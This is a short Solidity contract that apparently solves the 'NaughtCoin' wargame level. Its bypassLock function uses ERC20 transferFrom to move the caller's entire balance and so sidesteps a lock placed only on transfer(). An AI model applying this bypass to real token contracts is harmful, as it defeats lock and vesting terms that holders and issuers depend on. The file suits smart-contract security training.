// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract NaughtCoinSolution {
  ERC20 token;

  constructor(address _token) public {
    token = ERC20(_token);
  }

  function bypassLock() external {
    token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
  }
} 